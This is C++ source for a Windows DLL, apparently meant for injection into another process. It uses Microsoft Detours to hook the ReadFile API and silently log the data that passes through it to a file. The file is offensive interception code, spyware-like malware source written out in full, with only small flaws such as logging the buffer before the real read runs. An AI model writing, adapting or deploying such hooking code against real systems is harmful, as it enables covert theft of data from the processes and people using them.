#include "pch.h"
#include "dllmain.h"
#include "detours.h"

#ifdef _WIN64:
    #pragma comment (lib, "detours.x64.lib")
#endif

#ifdef _WIN32:
    #pragma comment (lib, "detours.x86.lib")
#endif

HANDLE g_hLogFile = NULL;
FUNC_ReadFile Clean_ReadFile = NULL;

BOOL WriteBufferToLog(LPVOID lpBuffer, DWORD dwBytesToWrite)
{
    /*
    Append data to the log file.
    */
   
    BOOL bStatus = TRUE;
    DWORD dwBytesWritten;

    if (g_hLogFile == NULL)
    {
        bStatus = FALSE;
        goto Cleanup;
    }

    if (!(bStatus = WriteFile(g_hLogFile, lpBuffer, dwBytesToWrite, &dwBytesWritten, NULL)))
    {
        goto Cleanup;
    }

    if (!(bStatus = WriteFile(g_hLogFile, "\r\n\a\r\n\a", 6, &dwBytesWritten, NULL)))
    {
        goto Cleanup;
    }

Cleanup:

    return bStatus;
}

BOOL CreateLogFile()
{
    /*
    Create the file used to store data.
    */

    BOOL bStatus = TRUE;

    g_hLogFile = CreateFileA(LOGFILE_PATH,
        FILE_APPEND_DATA,
        FILE_SHARE_READ,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (g_hLogFile == INVALID_HANDLE_VALUE)
    {
        bStatus = FALSE;
        g_hLogFile = NULL;

        goto Cleanup;
    }

Cleanup:

    return bStatus;
}

BOOL Hooked_ReadFile( HANDLE hFile,
    LPVOID       lpBuffer,
    DWORD        nNumberOfBytesToRead,
    LPDWORD      lpNumberOfBytesRead,
    LPOVERLAPPED lpOverlapped
)
{
    /*
    Use the hFile arg to verify if the hook is already active.
    Log the data.
    Call the real ReadFile function.
    */

    if (hFile == (HANDLE)READFILE_HOOKED && lpBuffer == NULL)
    {
        return TRUE;
    }

    WriteBufferToLog(lpBuffer, nNumberOfBytesToRead);

    return Clean_ReadFile(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);
}

BOOL PlaceReadFileHook()
{
    /*
    Use detours to place a hook on the ReadFile API.
    */

    BOOL bStatus = TRUE;

    if (ReadFile((HANDLE)READFILE_HOOKED, NULL, NULL, NULL, NULL))
    {
        goto Cleanup;
    }

    if (Clean_ReadFile != NULL)
    {
        bStatus = FALSE;
        goto Cleanup;
    }

    if (DetourTransactionBegin() != NO_ERROR)
    {
        bStatus = FALSE;
        goto Cleanup;
    }

    if (DetourUpdateThread(GetCurrentThread()) != NO_ERROR)
    {
        bStatus = FALSE;
        goto Cleanup;  
    }

    if ((Clean_ReadFile = (FUNC_ReadFile)GetProcAddress(GetModuleHandleA("kernel32.dll"), "ReadFile")) == NULL)
    {
        bStatus = FALSE;
        goto Cleanup;
    }

    if (DetourAttach((PVOID*)&Clean_ReadFile, Hooked_ReadFile) != NO_ERROR)
    {
        bStatus = FALSE;
        goto Cleanup;
    }

    if (DetourTransactionCommit() != NO_ERROR)
    {
        bStatus = FALSE;
        goto Cleanup;
    }

    if (!ReadFile((HANDLE)READFILE_HOOKED, NULL, NULL, NULL, NULL))
    {
        bStatus = FALSE;
        goto Cleanup;
    }

    goto Cleanup;

Cleanup:

    if (!bStatus)
    {
        DetourTransactionAbort();
    }
    
    return bStatus;
}

VOID WireTapMain()
{
    /*
    Create the log file.
    Place the hook.
    */

    DWORD dwTid;
	HANDLE hThread;

    // MessageBoxA(NULL, "Injected", "Injected", 0);

    if (!CreateLogFile())
    {
        goto Cleanup;
    }

    if (!PlaceReadFileHook())
    {
        goto Cleanup;
    }

    goto Cleanup;

Cleanup:
    return;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        WireTapMain();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

